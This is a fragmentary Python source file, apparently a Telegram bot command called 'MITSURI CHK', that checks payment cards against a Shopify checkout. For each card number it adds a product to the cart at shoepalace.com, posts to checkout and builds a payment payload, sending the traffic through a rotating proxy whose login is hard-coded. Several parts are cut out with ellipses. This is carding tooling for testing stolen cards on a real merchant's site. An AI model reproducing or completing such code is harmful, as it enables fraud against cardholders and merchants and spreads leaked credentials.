...
@Client.on_message(filters.command("kr", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
GATEWAY: <code>KRATOS</code>
PASARELA: <code>SHOPIFY + PZ $90</code> </b>""")
...
<b>あ MITSURI CHK あ</b>
<b>Gateway: <code>KRATOS</code></b> 
<b>ProcesoVerificando...</b>
<b>Tarjeta:</b> <code>{ccs}</code>
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}
 """)
        
        session = requests.Session()
        session.proxies = {'https': 'http://gsvqqpih-rotate:qrwhf7irmxxt@p.webshare.io:80'}

        inicio = time.time()
        print("</> INICIADO...")
        #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '42311833190606'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.shoepalace.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.shoepalace.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.shoepalace.com"
        }
